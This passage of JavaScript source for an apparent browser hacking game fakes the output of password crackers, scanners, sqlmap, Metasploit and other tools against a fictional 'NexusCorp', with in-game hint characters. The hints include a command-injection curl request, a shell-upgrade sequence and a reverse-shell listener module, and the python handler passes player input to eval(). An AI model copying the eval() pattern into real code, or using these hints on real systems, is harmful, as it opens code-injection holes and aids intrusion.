						s: "Enter old passphrase:\nEnter new passphrase:\nYour identification has been saved with the new passphrase.",
					},
				];
			return [
				{ t: "dim", s: `Generating public/private ${type} key pair.` },
				{
					t: "dim",
					s: `Enter file in which to save the key (${file}): [simulation: using ${file}]`,
				},
				{ t: "dim", s: `Enter passphrase (empty for no passphrase):` },
				{ t: "success", s: `Your identification has been saved in ${file}` },
				{ t: "success", s: `Your public key has been saved in ${file}.pub` },
				{
					t: "dim",
					s: `The key fingerprint is:\nSHA256:${btoa("ghost-key-" + Date.now()).substring(0, 43)} ghost@node-7.nexus`,
				},
				{
					t: "dim",
					s: `The key's randomart image:\n+---[RSA ${bits}]----+\n|    .+*=.        |\n|    oooo+        |\n|   . o+.E        |\n|    o ..         |\n|   . . S         |\n+----[SHA256]-----+`,
				},
			];
		};

		h.john = (args) => {
			const wordlist = args.find((a) => a.startsWith("--wordlist"));
			const file = args.find((a) => !a.startsWith("-") && !a.startsWith("--"));
			return [
				{ t: "warn", s: `John the Ripper 1.9.0 (64-bit)` },
				{ t: "dim", s: `Using default input encoding: UTF-8` },
				wordlist
					? { t: "dim", s: `Loaded ${wordlist} wordlist` }
					: { t: "dim", s: "Using default wordlist" },
				{
					t: "dim",
					s: `Loaded 2 password hashes with no different salts (sha512crypt, crypt(3) [$6$])`,
				},
				{
					t: "dim",
					s: `Press 'q' or Ctrl-C to abort, almost any other key for status`,
				},
				{
					t: "dim",
					s: `0g 0:00:00:42 DONE (2026-01-07 06:42) 0g/s 3123p/s 3123c/s 3123C/s`,
				},
				wordlist
					? { t: "success", s: `password123      (ghost)` }
					: {
							t: "dim",
							s: `(no passwords cracked — need wordlist: --wordlist=/usr/share/wordlists/rockyou.txt)`,
						},
				{ t: "dim", s: `Session completed.` },
			].filter((l) => l.s !== undefined);
		};

		h.hashcat = (args) => {
			const mode = args.includes("-m") ? args[args.indexOf("-m") + 1] : "0";
			const attack = args.includes("-a") ? args[args.indexOf("-a") + 1] : "0";
			return [
				{ t: "info", s: `hashcat (v6.2.6) starting...` },
				{ t: "dim", s: `OpenCL API (OpenCL 2.0 ) - Platform #1 [CPU]` },
				{ t: "dim", s: `Minimum password length supported: 0` },
				{ t: "dim", s: `Hashes: 1 digests (mode: ${mode})` },
				{
					t: "dim",
					s: `Optimizers applied: Zero-Byte, Early-Skip, Not-Salted`,
				},
				{ t: "dim", s: `Speed: 3.1 MH/s` },
				{
					t: "success",
					s: `5f4dcc3b5aa765d61d8327deb882cf99:password  (Status: Cracked!)`,
				},
				{
					t: "warn",
					s: `[CYPHER]: password? REALLY? NexusCorp deserves to be hacked.`,
				},
				{
					t: "dim",
					s: `Session..........: hashcat\nStatus...........: Cracked\nTime.Estimated...: (2 secs)`,
				},
			];
		};

		h.hydra = (args) => {
			const service =
				args.find((a) => ["ssh", "ftp", "http", "https", "smb"].includes(a)) ||
				"ssh";
			const target =
				args.find(
					(a) => !a.startsWith("-") && !["ssh", "ftp", "http"].includes(a),
				) || "nexus.corp";
			return [
				{
					t: "info",
					s: `Hydra v9.4 (https://github.com/vanhauser-thc/thc-hydra)`,
				},
				{
					t: "dim",
					s: `[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries`,
				},
				{
					t: "dim",
					s: `[DATA] attacking ${service}://${target}:${service === "ssh" ? 22 : 80}/`,
				},
				{
					t: "warn",
					s: `[22][ssh] host: ${target}   login: ghost   password: (rate limited — use wordlist)`,
				},
				{ t: "dim", s: `1 of 1 target completed, 0 valid passwords found` },
				{
					t: "dim",
					s: `[CAUTION] Use responsibly. Only test systems you own or have explicit permission.`,
				},
				{
					t: "warn",
					s: `[ADA-7]: Found the SSH port. But we need actual creds. Check the backup config.`,
				},
			];
		};

		h.gobuster = h.dirb = (args) => {
			const url = args.find((a) => a.startsWith("http")) || "http://nexus.corp";
			const wordlist = args.includes("-w")
				? args[args.indexOf("-w") + 1]
				: "/usr/share/wordlists/common.txt";
			return [
				{ t: "info", s: `Gobuster v3.5 by OJ Reeves (@TheColonial)` },
				{ t: "dim", s: `[+] Url: ${url}` },
				{ t: "dim", s: `[+] Wordlist: ${wordlist}` },
				{ t: "dim", s: `[+] Status codes: 200,204,301,302,307,401,403` },
				{ t: "dim", s: `` },
				{ t: "success", s: `/api/status (Status: 200) [Size: 128]` },
				{ t: "success", s: `/api/chimera (Status: 403) [Size: 42]` },
				{ t: "warn", s: `/api/debug (Status: 200) [Size: 0]  ← INTERESTING` },
				{ t: "warn", s: `/.htaccess (Status: 200) [Size: 256]` },
				{ t: "success", s: `/backup (Status: 301) [Size: 0]` },
				{ t: "dim", s: `` },
				{
					t: "info",
					s: `Finished. Try: curl http://nexus.corp/api/debug?cmd=whoami`,
				},
			];
		};

		h.nikto = (args) => {
			const target = args.find((a) => !a.startsWith("-")) || "nexus.corp";
			return [
				{ t: "info", s: `Nikto v2.1.6` },
				{ t: "dim", s: `+ Target IP: 10.0.1.100` },
				{ t: "dim", s: `+ Target Hostname: ${target}` },
				{ t: "dim", s: `+ Target Port: 80` },
				{ t: "dim", s: `` },
				{
					t: "warn",
					s: `+ /api/debug: DEBUG endpoint found. May allow command execution.`,
				},
				{
					t: "warn",
					s: `+ Server: NexusCorp-Server/3.2 — version fingerprinted`,
				},
				{ t: "warn", s: `+ X-Powered-By: CHIMERA/3.2.1 — non-standard header` },
				{
					t: "warn",
					s: `+ OSVDB-877: HTTP TRACE method is active, suggesting XST possible.`,
				},
				{ t: "success", s: `+ 1 host(s) tested` },
			];
		};

		h.sqlmap = (args) => [
			{ t: "info", s: `sqlmap/1.7.8 — automatic SQL injection tool` },
			{
				t: "dim",
				s: `[!] legal disclaimer: Usage only for authorized testing`,
			},
			{ t: "dim", s: `` },
			{ t: "dim", s: `[*] starting at ${new Date().toLocaleTimeString()}` },
			{ t: "dim", s: `[*] testing connection to the target URL` },
			{
				t: "warn",
				s: `[+] GET parameter 'id' appears to be 'AND boolean-based blind' injectable`,
			},
			{
				t: "warn",
				s: `[+] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind' injectable`,
			},
			{ t: "success", s: `[+] Database: chimera_prod` },
			{
				t: "success",
				s: `[+] Tables: users, surveillance_data, key_storage, endpoints`,
			},
			{
				t: "warn",
				s: `[ADA-7]: The database! key_storage might have the master key backup.`,
			},
		];

		h.msfconsole = h.metasploit = (args) => [
			{ t: "system", s: "" },
			{
				t: "system",
				s: "       =[ metasploit v6.3.4-dev                          ]",
			},
			{
				t: "system",
				s: "+ -- --=[ 2305 exploits - 1214 auxiliary - 407 post       ]",
			},
			{
				t: "system",
				s: "+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]",
			},
			{ t: "dim", s: "" },
			{ t: "info", s: "msf6 > " },
			{ t: "dim", s: "(Metasploit Framework — simulation mode)" },
			{ t: "dim", s: "Common modules:" },
			{
				t: "dim",
				s: "  use exploit/multi/handler          # reverse shell listener",
			},
			{ t: "dim", s: "  use auxiliary/scanner/portscan/tcp # port scanner" },
			{
				t: "dim",
				s: "  use post/linux/gather/enum_linux   # system enumeration",
			},
			{ t: "dim", s: "" },
			{
				t: "warn",
				s: "[CYPHER]: Real Metasploit is at metasploit.com. This is educational simulation.",
			},
		];

		h.searchsploit = (args) => {
			const query = args.join(" ");
			return [
				{ t: "info", s: `Exploit Database (searchsploit)` },
				{ t: "dim", s: `Searching for: ${query}` },
				{
					t: "dim",
					s: `---------------------------------------------------------------------`,
				},
				{
					t: "dim",
					s: `Exploit Title                                     |  Path`,
				},
				{
					t: "dim",
					s: `---------------------------------------------------------------------`,
				},
				{
					t: "success",
					s: `NexusCorp CHIMERA 3.x - Buffer Overflow           | linux/local/49912.py`,
				},
				{
					t: "success",
					s: `NexusCorp CHIMERA 3.2.1 - Auth Bypass             | linux/remote/49913.rb`,
				},
				{
					t: "warn",
					s: `NexusCorp heartbeat Binary - RCE (CVE-2026-1337)   | linux/remote/49914.c`,
				},
				{
					t: "dim",
					s: `---------------------------------------------------------------------`,
				},
				{
					t: "warn",
					s: `[CYPHER]: CVE-2026-1337! The heartbeat binary exploit is your path in.`,
				},
			];
		};

		h.strace = (args) => {
			const pid = args.includes("-p") ? args[args.indexOf("-p") + 1] : null;
			const cmd = args.find((a) => !a.startsWith("-") && a !== pid);
			if (pid === "1337") {
				if (!this._rootShell)
					return [
						{
							t: "error",
							s: "strace: attach to PID 1337: Operation not permitted (need root)",
						},
					];
				return [
					{ t: "dim", s: `strace: Process 1337 attached` },
					{
						t: "dim",
						s: `read(7, "AUTH_TOKEN=NX-CHIM-2026-01-ALPHA-9174\\0", 4096) = 40`,
					},
					{
						t: "warn",
						s: `write(7, "{"status":"sync","batch":8,"endpoints":847}", 42) = 42`,
					},
					{
						t: "warn",
						s: `recvfrom(7, "CHIMERA_ACK\\0\\1\\0\\0", 12, 0, ...) = 12`,
					},
					{ t: "dim", s: `nanosleep({tv_sec=5, tv_nsec=0}, NULL) = 0` },
					{
						t: "warn",
						s: `[CYPHER]: Look! AUTH_TOKEN in the syscall! Same as /proc/1337/environ`,
					},
				];
			}
			return [
				{ t: "dim", s: `execve("${cmd || "/bin/ls"}", ...) = 0` },
				{ t: "dim", s: `brk(NULL) = 0x55a4d3f2e000` },
				{ t: "dim", s: `access("/etc/ld.so.preload", R_OK) = -1 ENOENT` },
				{
					t: "dim",
					s: `openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3`,
				},
				{ t: "dim", s: `read(3, "\\177ELF...", 832) = 832` },
				{ t: "dim", s: `...` },
				{ t: "dim", s: `exit_group(0) = ?` },
				{ t: "dim", s: `+++ exited with 0 +++` },
			];
		};

		h.ltrace = (args) => [
			{ t: "dim", s: `ltrace: library call tracer` },
			{ t: "dim", s: `malloc(512) = 0x55a4d3f2e000` },
			{ t: "dim", s: `strcpy(0x55a, "NX-CHIM-2026-01-ALPHA-9174") = 0x55a` },
			{
				t: "dim",
				s: `printf("AUTH_TOKEN=%s\\n", "NX-CHIM-2026-01-ALPHA-9174")`,
			},
		];

		h.gdb = (args) => {
			const prog = args[0];
			return [
				{ t: "dim", s: `GNU gdb (Ubuntu 12.1) 12.1` },
				{ t: "dim", s: `Copyright (C) 2022 Free Software Foundation, Inc.` },
				{
					t: "dim",
					s: prog ? `Reading symbols from ${prog}...` : `(no file specified)`,
				},
				{ t: "info", s: `(gdb) ` },
				{ t: "dim", s: `Common commands:` },
				{
					t: "dim",
					s: `  run, break <func>, next, step, print <var>, info registers, x/16xb <addr>`,
				},
				{
					t: "dim",
					s: `  disassemble <func>, checksec, pattern create 200, cyclic 200`,
				},
				{ t: "dim", s: `(Simulation: gdb loaded but not interactive)` },
			];
		};

		h.objdump = (args) => {
			const flags = args.filter((a) => a.startsWith("-")).join("");
			const file = args.find((a) => !a.startsWith("-"));
			return [
				{ t: "dim", s: `${file}: file format elf64-x86-64` },
				{ t: "dim", s: "" },
				{ t: "dim", s: `Disassembly of section .text:` },
				{ t: "dim", s: `` },
				{ t: "dim", s: `0000000000401156 <main>:` },
				{ t: "dim", s: `  401156: 55           push   %rbp` },
				{ t: "dim", s: `  401157: 48 89 e5     mov    %rsp,%rbp` },
				{ t: "dim", s: `  40115a: e8 a1 ff ff ff  callq  401100 <check_auth>` },
				{
					t: "warn",
					s: `  401160: 48 bf ...    movabs $0x4e582d4348494d2c,%rdi  ; "NX-CHIM"`,
				},
			];
		};

		h.readelf = (args) => {
			const file = args.find((a) => !a.startsWith("-"));
			return [
				{ t: "dim", s: `ELF Header:` },
				{
					t: "dim",
					s: `  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00`,
				},
				{ t: "dim", s: `  Class:                             ELF64` },
				{ t: "dim", s: `  OS/ABI:                            UNIX - System V` },
				{ t: "dim", s: `  Entry point address:               0x401060` },
				{ t: "dim", s: `  Number of section headers:         27` },
				{
					t: "warn",
					s: `  (Strings section contains: NX-CHIM-2026, nexus.corp, AUTH_TOKEN)`,
				},
			];
		};

		h.nm = (args) => {
			const file = args[0];
			return [
				{ t: "dim", s: `0000000000404028 B __bss_start` },
				{ t: "dim", s: `                 U fgets@@GLIBC_2.2.5` },
				{ t: "warn", s: `0000000000401156 T check_auth` },
				{ t: "warn", s: `0000000000401200 T validate_token` },
				{ t: "dim", s: `0000000000401060 T _start` },
			];
		};

		h.ldd = (args) => {
			const file = args[0];
			return [
				{ t: "dim", s: `\tlinux-vdso.so.1 => (0x00007ffce8b10000)` },
				{ t: "dim", s: `\tlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6` },
				{ t: "dim", s: `\t/lib64/ld-linux-x86-64.so.2 (0x00007f6c1d3fb000)` },
				{
					t: "warn",
					s: `\tlibchimera.so.3 => /opt/chimera/lib/libchimera.so.3`,
				},
			];
		};

		h.binwalk = (args) => {
			const file = args[0];
			return [
				{ t: "info", s: `DECIMAL       HEXADECIMAL     DESCRIPTION` },
				{ t: "dim", s: `0             0x0             ELF executable` },
				{
					t: "success",
					s: `4096          0x1000          LZMA compressed data`,
				},
				{ t: "warn", s: `8192          0x2000          PEM certificate` },
				{
					t: "warn",
					s: `12288         0x3000          Embedded base64 string: "NX-CHIM-2026-01-ALPHA-9174"`,
				},
			];
		};

		h.exiftool = (args) => {
			const file = args[args.length - 1];
			return [
				{ t: "dim", s: `======== ${file}` },
				{ t: "dim", s: `ExifTool Version Number         : 12.50` },
				{ t: "dim", s: `File Name                       : ${file}` },
				{ t: "dim", s: `File Type                       : PNG` },
				{
					t: "warn",
					s: `Author                          : nova@nexuscorp.com`,
				},
				{
					t: "warn",
					s: `Comment                         : CHIMERA-3.2.1 operational screenshot`,
				},
				{ t: "dim", s: `GPS Position                    : [REDACTED]` },
				{
					t: "warn",
					s: `[CYPHER]: Author metadata leaked. nova@nexuscorp.com confirmed.`,
				},
			];
		};

		h.steghide = (args) => {
			const extract = args[0] === "extract";
			const file = args.includes("-sf") ? args[args.indexOf("-sf") + 1] : null;
			if (extract && file) {
				return [
					{ t: "dim", s: `Enter passphrase:` },
					{ t: "success", s: `wrote extracted data to "hidden_message.txt".` },
					{
						t: "warn",
						s: `[CYPHER]: Check hidden_message.txt for the steganography payload.`,
					},
				];
			}
			return [
				{
					t: "dim",
					s: "steghide: steganography tool\nUsage: steghide extract -sf image.jpg\n       steghide embed -cf image.jpg -ef secret.txt",
				},
			];
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 9: FIREWALL / IDS
		// ═══════════════════════════════════════════════════════════════

		h.iptables = (args) => {
			if (!this._rootShell)
				return [{ t: "error", s: "iptables: Permission denied (need root)" }];
			if (args.includes("-L"))
				return [
					{ t: "dim", s: "Chain INPUT (policy ACCEPT)" },
					{
						t: "dim",
						s: "target     prot opt source               destination",
					},
					{
						t: "warn",
						s: "DROP       all  --  0.0.0.0/0            0.0.0.0/0  /* nexus_mod: block exfil */",
					},
					{
						t: "info",
						s: "ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0  dport 22 /* ssh */",
					},
					{
						t: "warn",
						s: "ACCEPT     tcp  --  10.0.1.0/24          0.0.0.0/0  dport 8443 /* chimera internal */",
					},
					{ t: "dim", s: "" },
					{ t: "dim", s: "Chain OUTPUT (policy ACCEPT)" },
					{
						t: "warn",
						s: "DROP       all  --  0.0.0.0/0            !10.0.1.0/24 /* block external */",
					},
				];
			return [{ t: "success", s: `iptables: ${args.join(" ")} — applied` }];
		};

		h.ufw = (args) => {
			if (args[0] === "status")
				return [
					{ t: "info", s: "Status: active" },
					{ t: "dim", s: "" },
					{ t: "dim", s: "To                         Action      From" },
					{ t: "dim", s: "--                         ------      ----" },
					{
						t: "success",
						s: "22/tcp                     ALLOW       Anywhere",
					},
					{
						t: "warn",
						s: "8443/tcp                   ALLOW       10.0.1.0/24",
					},
					{
						t: "warn",
						s: "Anywhere                   DENY OUT    !10.0.1.0/24",
					},
				];
			return [{ t: "success", s: `ufw: ${args.join(" ")}` }];
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 10: SERVICES
		// ═══════════════════════════════════════════════════════════════

		h.systemctl = (args) => {
			const action = args[0];
			const unit = args[1];
			if (action === "status")
				return [
					{
						t: "info",
						s: `● ${unit || "nexus-daemon"}.service - NexusCorp Daemon`,
					},
					{
						t: "dim",
						s: `   Loaded: loaded (/lib/systemd/system/${unit || "nexus"}.service; enabled)`,
					},
					{
						t: "success",
						s: `   Active: active (running) since 2026-01-07 06:00:00 UTC`,
					},
					{
						t: "dim",
						s: `  Process: 1337 ExecStart=/usr/sbin/nexus-daemon --mode=shadow`,
					},
					{ t: "dim", s: `  CGroup: /system.slice/nexus-daemon.service` },
					{
						t: "warn",
						s: `          └─1337 nexus-daemon --mode=shadow --config=/opt/chimera/config/master.conf`,
					},
				];
			if (action === "list-units")
				return [
					{
						t: "dim",
						s: "UNIT                          LOAD   ACTIVE SUB     DESCRIPTION",
					},
					{
						t: "success",
						s: "sshd.service                  loaded active running OpenSSH Server",
					},
					{
						t: "success",
						s: "apache2.service               loaded active running Apache HTTP Server",
					},
					{
						t: "warn",
						s: "nexus-daemon.service           loaded active running NexusCorp CHIMERA Daemon",
					},
					{
						t: "dim",
						s: "cron.service                   loaded active running Regular Background Jobs",
					},
				];
			if (
				!this._rootShell &&
				["stop", "restart", "disable", "enable"].includes(action)
			) {
				return [
					{ t: "error", s: `systemctl: ${action} ${unit}: Permission denied` },
				];
			}
			return [{ t: "success", s: `systemctl ${args.join(" ")}: OK` }];
		};

		h.service = (args) => {
			const unit = args[0];
			const action = args[1];
			if (action === "status") return h.systemctl(["status", unit]);
			return [{ t: "success", s: `service ${args.join(" ")}: OK` }];
		};

		h.journalctl = (args) => {
			const unit = args.includes("-u") ? args[args.indexOf("-u") + 1] : null;
			const follow = args.includes("-f");
			const n = args.includes("-n")
				? parseInt(args[args.indexOf("-n") + 1]) || 20
				: 20;
			const r = fs.cat(
				unit === "nexus-daemon" ? "/var/log/nexus.log" : "/var/log/syslog",
			);
			const lines = r.error
				? []
				: r.content.split("\n").filter(Boolean).slice(-n);
			const out = lines.map((s) => ({ t: "dim", s }));
			if (follow)
				out.push({
					t: "dim",
					s: "(journalctl -f: watching... Ctrl+C to stop)",
				});
			return out.length ? out : [{ t: "dim", s: "(no log entries)" }];
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 11: PACKAGE MANAGERS & INSTALLATION
		// ═══════════════════════════════════════════════════════════════

		const PKG_DB = {
			nmap: { desc: "Network exploration tool", installs: "nmap", xp: 10 },
			gobuster: {
				desc: "Directory brute-forcer",
				installs: "gobuster",
				xp: 15,
			},
			john: { desc: "Password cracker", installs: "john", xp: 15 },
			hashcat: {
				desc: "Advanced password recovery",
				installs: "hashcat",
				xp: 15,
			},
			hydra: { desc: "Network brute-forcer", installs: "hydra", xp: 15 },
			metasploit: {
				desc: "Exploitation framework",
				installs: "metasploit",
				xp: 25,
			},
			sqlmap: { desc: "SQL injection tool", installs: "sqlmap", xp: 20 },
			ghidra: { desc: "Reverse engineering tool", installs: "ghidra", xp: 30 },
			volatility: { desc: "Memory forensics", installs: "volatility", xp: 25 },
			binwalk: { desc: "Firmware analyzer", installs: "binwalk", xp: 20 },
			"aircrack-ng": {
				desc: "WiFi security tool",
				installs: "aircrack",
				xp: 25,
			},
			python3: { desc: "Python 3 interpreter", installs: "python3", xp: 5 },
			golang: { desc: "Go programming language", installs: "go", xp: 20 },
			rust: { desc: "Rust programming language", installs: "cargo", xp: 20 },
			docker: { desc: "Container runtime", installs: "docker", xp: 15 },
			kubectl: { desc: "Kubernetes client", installs: "kubectl", xp: 15 },
			terraform: {
				desc: "Infrastructure as Code",
				installs: "terraform",
				xp: 20,
			},
			ansible: {
				desc: "Configuration management",
				installs: "ansible",
				xp: 20,
			},
		};

		h.apt = h["apt-get"] = (args) => {
			const action = args[0];
			const pkg = args.find((a) => !a.startsWith("-") && a !== action);
			if (action === "list")
				return [
					{ t: "dim", s: "Listing... Done" },
					...Object.entries(PKG_DB).map(([n, p]) => ({
						t: this._installedPkgs.has(n) ? "success" : "dim",
						s: `${n}/${this._installedPkgs.has(n) ? "installed" : "jammy"} [${this._installedPkgs.has(n) ? "installed" : "available"}] — ${p.desc}`,
					})),
				];
			if (action === "install" && pkg) {
				if (PKG_DB[pkg]) {
					this._installedPkgs.add(pkg);
					localStorage.setItem(
						"td-pkgs",
						JSON.stringify([...this._installedPkgs]),
					);
					gs.addXP(PKG_DB[pkg].xp, "programming");
					return [
						{ t: "dim", s: `Reading package lists... Done` },
						{ t: "dim", s: `Building dependency tree... Done` },
						{
							t: "dim",
							s: `The following NEW packages will be installed: ${pkg}`,
						},
						{
							t: "dim",
							s: `0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.`,
						},
						{ t: "dim", s: `Setting up ${pkg}...` },
						{
							t: "success",
							s: `${pkg} installed successfully (+${PKG_DB[pkg].xp} XP)`,
						},
					];
				}
				return [
					{
						t: "error",
						s: `E: Unable to locate package ${pkg}\n(Available: ${Object.keys(PKG_DB).join(", ")})`,
					},
				];
			}
			if (action === "update")
				return [
					{
						t: "success",
						s: "Hit:1 http://nexus.corp/apt nexusos InRelease\nReading package lists... Done",
					},
				];
			if (action === "upgrade")
				return [
					{
						t: "success",
						s: "0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.",
					},
				];
			return [
				{
					t: "dim",
					s: "apt: package manager\nUsage: apt install <package>, apt list, apt update, apt upgrade",
				},
			];
		};

		h.pkg = (args) => {
			const action = args[0];
			if (action === "install") return h.apt(["install", ...args.slice(1)]);
			if (action === "list") return h.apt(["list", ...args.slice(1)]);
			if (action === "info") {
				const pkg = args[1];
				const info = PKG_DB[pkg];
				if (!info) return [{ t: "error", s: `pkg: ${pkg}: package not found` }];
				return [
					{ t: "info", s: `Name: ${pkg}` },
					{ t: "dim", s: `Description: ${info.desc}` },
					{ t: "dim", s: `XP Reward: +${info.xp}` },
					{
						t: info.installed ? "success" : "warn",
						s: `Status: ${this._installedPkgs.has(pkg) ? "installed" : "available"}`,
					},
				];
			}
			return [
				{
					t: "dim",
					s: "pkg: game package manager\nUsage: pkg install <tool>, pkg list, pkg info <tool>",
				},
			];
		};

		h.pip = h.pip3 = (args) => {
			const action = args[0];
			const pkg = args[1];
			if (action === "install")
				return [
					{
						t: "success",
						s: `Collecting ${pkg}\nInstalling collected packages: ${pkg}\nSuccessfully installed ${pkg}-1.0.0`,
					},
				];
			if (action === "list")
				return [
					{
						t: "dim",
						s: "requests==2.28.1\nnumpy==1.24.0\ncryptography==41.0.0\nparamiko==3.0.0\nscapy==2.5.0",
					},
				];
			if (action === "freeze")
				return [
					{
						t: "dim",
						s: "requests==2.28.1\nnumpy==1.24.0\ncryptography==41.0.0",
					},
				];
			return [
				{
					t: "dim",
					s: "pip: Python package installer\nUsage: pip install <package>, pip list, pip freeze > requirements.txt",
				},
			];
		};

		h.npm = (args) => {
			const action = args[0];
			const pkg = args[1];
			if (action === "install" || action === "i")
				return [
					{
						t: "success",
						s: `added ${pkg || "packages"} to node_modules/\nfound 0 vulnerabilities`,
					},
				];
			if (action === "list" || action === "ls")
				return [
					{
						t: "dim",
						s: "└── (local packages)\n    ├── express@4.18.2\n    └── axios@1.3.4",
					},
				];
			return [
				{
					t: "dim",
					s: "npm: Node.js package manager\nUsage: npm install <package>, npm list, npm run <script>",
				},
			];
		};

		h.yarn = (args) => {
			const action = args[0];
			return [
				{
					t: "success",
					s: `yarn ${action || "v1.22.19"}: ${args.slice(1).join(" ") || "Done."}`,
				},
			];
		};

		h.brew = (args) => {
			const action = args[0];
			if (action === "install")
				return [
					{
						t: "success",
						s: `==> Downloading ${args[1]}...\n==> Pouring ${args[1]}... 🍺`,
					},
				];
			return [
				{
					t: "dim",
					s: "brew: Homebrew package manager (macOS/Linux)\nUsage: brew install <package>, brew list, brew update",
				},
			];
		};

		h.gem = (args) => {
			const action = args[0];
			if (action === "install")
				return [
					{
						t: "success",
						s: `Successfully installed ${args[1]}-1.0.0\n1 gem installed`,
					},
				];
			return [
				{
					t: "dim",
					s: "gem: Ruby gem package manager\nUsage: gem install <gem>, gem list",
				},
			];
		};

		h.cargo = (args) => {
			const action = args[0];
			if (action === "build")
				return [
					{
						t: "success",
						s: "Compiling... Finished release [optimized] target(s) in 2.34s",
					},
				];
			if (action === "run")
				return [{ t: "success", s: "Compiling... Running target/release/app" }];
			if (action === "new")
				return [
					{
						t: "success",
						s: `Created binary (application) \`${args[1]}\` project`,
					},
				];
			return [
				{
					t: "dim",
					s: "cargo: Rust package manager\nUsage: cargo build, cargo run, cargo new <name>, cargo add <dep>",
				},
			];
		};

		h.yum = h.dnf = h.pacman = (args) => h.apt(args);

		// ═══════════════════════════════════════════════════════════════
		// SECTION 12: PROGRAMMING LANGUAGES
		// ═══════════════════════════════════════════════════════════════

		h.python = h.python3 = (args) => {
			if (args[0] === "-c") {
				const code = args.slice(1).join(" ");
				// Handle common patterns
				const printMatch = code.match(/print\s*\(\s*["'`](.*)["'`]\s*\)/);
				const printExpr = code.match(/print\s*\(\s*(.+)\s*\)/);
				const importOs =
					code.includes("import os") && code.includes("os.system");
				if (printMatch) return [{ t: "info", s: printMatch[1] }];
				if (printExpr && !printMatch) {
					try {
						return [
							{
								t: "info",
								s: String(eval(printExpr[1].replace(/\*\*/g, "**"))),
							},
						];
					} catch {}
				}
				if (importOs)
					return [
						{
							t: "warn",
							s: "[CYPHER]: os.system() in Python — this is how you run shell commands from scripts.",
						},
						...this.execute(
							code.match(/os\.system\(['"](.+)['"]\)/)?.[1] || 'echo "command"',
						),
					];
				return [{ t: "dim", s: `>>> (code executed: ${code.slice(0, 50)})` }];
			}
			if (args[0] === "-m") {
				const mod = args[1];
				if (mod === "http.server")
					return [
						{
							t: "success",
							s: `Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...`,
						},
					];
				if (mod === "pty")
					return [
						{
							t: "dim",
							s: "$ (PTY spawned — use for shell upgrades: python3 -m pty; stty raw -echo; fg)",
						},
					];
				return [
					{ t: "dim", s: `python3 -m ${mod} ${args.slice(2).join(" ")}` },
				];
			}
			const file = args[0];
			if (file) {
				const r = fs.cat(file);
				if (r.error) return [{ t: "error", s: r.error }];
				const out = [];
				// Execute simple scripts
				r.content.split("\n").forEach((line) => {
					const pm = line.match(/print\s*\(\s*["'f](.+)["']\s*\)/);
					if (pm) out.push({ t: "info", s: pm[1] });
				});
				if (!out.length) out.push({ t: "dim", s: `(Script ${file} executed)` });
				return out;
			}
			return [
				{
					t: "dim",
					s: "Python 3.11.0 (Terminal Depths)\n>>> (interactive mode — run scripts with: python3 script.py)",
				},
			];
		};

		h.node = h.nodejs = (args) => {
			if (args[0] === "-e") {
				const code = args.slice(1).join(" ");
				const m = code.match(/console\.log\s*\(\s*["'`](.*)["'`]\s*\)/);
				if (m) return [{ t: "info", s: m[1] }];
				return [{ t: "dim", s: `(executed: ${code.slice(0, 60)})` }];
			}
			return [
				{
					t: "dim",
					s: "Welcome to Node.js v20.11.0 (Terminal Depths)\n> (REPL mode — run files: node script.js)",
				},
			];
		};

		h.ruby = (args) => {
			if (args[0] === "-e") {
				const code = args.slice(1).join(" ");
				const m = code.match(/puts\s+["'](.*)["']/);
				if (m) return [{ t: "info", s: m[1] }];
				return [{ t: "dim", s: `(ruby: ${code.slice(0, 50)})` }];
			}
			return [
				{
					t: "dim",
					s: "Ruby 3.2.0 (Terminal Depths)\n(usage: ruby -e \"puts 'hello'\", ruby script.rb)",
				},
			];
		};

		h.perl = (args) => {
			if (args[0] === "-e") {
				const code = args.slice(1).join(" ");
				const m = code.match(/print\s+["'](.*)["']/);
				if (m) return [{ t: "info", s: m[1] }];
				return [{ t: "dim", s: `(perl: ${code.slice(0, 50)})` }];
			}
			return [
				{
					t: "dim",
					s: "perl v5.36.0 (Terminal Depths)\n(usage: perl -e \"print 'hello\\n'\", perl script.pl)",
				},
			];
		};

		h.go = (args) => {
			const action = args[0];
			if (action === "run")
				return [{ t: "success", s: `(go run ${args.slice(1).join(" ")})` }];
			if (action === "build")
				return [
					{ t: "success", s: `Build successful: ./${args[1] || "main"}` },
				];
			if (action === "get")
				return [{ t: "success", s: `go: downloading ${args[1] || "package"}` }];
			return [
				{
					t: "dim",
					s: "Go 1.21.0 (Terminal Depths)\nUsage: go run main.go, go build, go test, go get <package>",
				},
			];
		};

		h.gcc =
			h.cc =
			h["g++"] =
				(args) => {
					const output = args.includes("-o")
						? args[args.indexOf("-o") + 1]
						: "a.out";
					const file = args.find((a) => !a.startsWith("-") && a !== output);
					if (!file) return [{ t: "error", s: "gcc: no input files" }];
					return [{ t: "success", s: `gcc: compiled ${file} → ${output}` }];
				};

		h.lua = (args) => [
			{
				t: "dim",
				s: "Lua 5.4.4 (Terminal Depths)\n(usage: lua -e \"print('hello')\", lua script.lua)",
			},
		];
		h.java = (args) => {
			if (args[0] && args[0].endsWith(".jar"))
				return [{ t: "dim", s: `java: running ${args[0]}` }];
			return [
				{
					t: "dim",
					s: 'java version "17.0.7" 2023-04-18 LTS\njava(TM) SE Runtime Environment',
				},
			];
		};
		h.javac = (args) => [
			{ t: "success", s: `javac: compiled ${args.join(" ")}` },
		];
		h.rustc = (args) => {
			const file = args.find((a) => !a.startsWith("-"));
			return [{ t: "success", s: `rustc: compiled ${file || "main.rs"}` }];
		};
		h.swift = (args) => [
			{ t: "dim", s: "Swift version 5.9 (swift-5.9-RELEASE)" },
		];
		h["R"] = (args) => [
			{
				t: "dim",
				s: 'R version 4.3.0 (2023-04-21) -- "Already Tomorrow"\n(statistical computing — Type q() to quit)',
			},
		];

		// ═══════════════════════════════════════════════════════════════
		// SECTION 13: EDITORS
		// ═══════════════════════════════════════════════════════════════

		h.vim = h.vi = (args) => {
